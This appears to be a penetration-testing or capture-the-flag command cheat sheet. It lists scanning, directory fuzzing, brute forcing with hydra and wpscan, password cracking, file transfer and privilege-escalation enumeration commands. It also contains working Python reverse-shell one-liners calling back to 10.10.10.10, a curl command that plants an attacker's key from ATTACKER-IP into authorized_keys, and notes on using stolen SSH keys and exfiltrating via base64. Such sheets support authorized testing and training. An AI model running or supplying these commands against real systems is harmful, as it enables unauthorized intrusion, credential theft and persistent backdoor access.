# Accessing website or application through linux
curl <server-ip>

# Network Mapper to find open ports and services
nmap <server-ip>
nmap -vv -sC -sV -oN nmap.log $IP # Basic scan
nmap -vv -A -p- -oN nmap-complete.log $IP # Complete nmap scan

# SSH to server
ssh username@server

# SSH with stolen private key
ssh -i my_private_key.pem user@hostname

# WEB:

# gobuster for directory enum
gobuster dir -u <url> -w <wordlist_file.txt> -x <file_extensions>
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.log -t 200 -u $URL

# Wfuzz
wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 --hc 404 http://www.host.name/?parameter=FUZZ # Brute force query params
wfuzz -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 --hc 404 http://www.host.name/FUZZ
wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 200 --hc 404 -R $DEPTH http://www.host.name/FUZZ # Recursive directory scanning

hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<Login Page>:<Request Body>:<Error Message>" # Hydra
wpscan --url $URL --passwords /usr/share/wordlists/rockyou.txt --usernames usernames.txt # Wordpress Scanner
wfuzz -c -f wfuzz-sub.log -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u $URL -H "Host: FUZZ.host.name" -t 32 --hc 200 --hw 356
gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $URL -t 32

# CRACKING
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip
hashcat -m $MODE hashes /usr/share/wordlists/rockyou.txt

# Brute-Force SSH
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh

# Steganography
pip3 install stegcracker
python3 -m stegcracker tocrack.jpg

# Transferring Files
python3 -m http.server -b $IP $PORT
php -S $IP:$PORT
wget http://$IP:$PORT/file
curl http://$IP:$PORT/file -o target_file
nc $IP $PORT > target_file

scp /path/to/file user@$HOST:/path/
scp /path/to/file user@$HOST:/path/different_name
scp user@$HOST:/path/to/file /local/directory

# Server
nc -lp $PORT < file
# Client
nc $IP $PORT > file


# Search recurively through directories finding any character match
grep -R .

# Start listening for connection on port 9999
nc -lvnp 9999

# Banner Grabbing
nc -vn <IP> 22


# Allows for command history when in a reverse shell
rlwrap nc -lvnp 9999

# Find the ip address of your main nic
ip addr show eth0

# Reverse Shell with Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
export RHOST="10.10.10.10";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

# Returns the hostname of the machine, it can provide information about the target system's role within the network
hostname

# Provides details about the kernel, which is useful in searching for a kernel exploit
uname -a

# Provides information on the kernel version and whether a compiler is installed or not GCC for instance
cat /proc/version

# Can contain info on the OS
cat /etc/issue

# All running processes
ps -A
ps aux

# Shows the list of commands the user is allowed to run as a root user.
sudo -l

# Show all files and directories, including hidden ones
ls -la

# Provide the information on the user's privilege level and the groups that the user is in.
id

# When pivoting, the ifconfig command provides information on the available network interfaces of the system.
ifconfig

# Stablizing Netcat shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Background the Netcat shell using CTRL+Z
# Back in your own terminal type “stty raw -echo; fg”

# Linpeas is a script for enumerating all possible directories for privilege escalation
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh

# Tranferring Files
scp /path/to/local/file username@target-server-ip:/path/to/destination

# Finds files with the setuid bit set in the entire filesystem, suppresses any error messages, and then lists detailed information about these files.
find / -perm -4000 2> /dev/null | xargs ls -lah

# Exfiltrating using base64 
base64 -w 0 file

# Get HexDump without new lines
xxd -p boot12.bin | tr -d '\n'

# Add public key authorized keys file
curl https://ATTACKER-IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

#Sort
sort -nr #Sort by number and then reverse
cat file | sort | uniq #Sort and delete duplicates

#Replace in file
sed -i 's/OLD/NEW/g' path/file #Replace string inside a file












